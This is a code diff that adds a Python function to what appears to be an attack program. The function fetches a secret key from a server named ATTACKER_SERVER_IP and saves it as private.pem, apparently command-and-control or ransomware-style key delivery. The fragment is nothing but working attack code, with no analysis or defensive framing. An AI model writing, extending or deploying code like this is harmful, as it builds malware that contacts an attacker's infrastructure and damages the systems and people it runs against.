@@ -51,6 +51,13 @@ def reset_instruction():
         # print(f"Error resetting the instruction: {e}")
         pass
 
+def download_secret_key():
+    response = requests.get(f'{ATTACKER_SERVER_IP}/send_secret_key')
+    if response.status_code == 200:
+        with open('./media/private.pem', 'wb') as file:
+            file.write(response.content)
+    else: pass
+
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
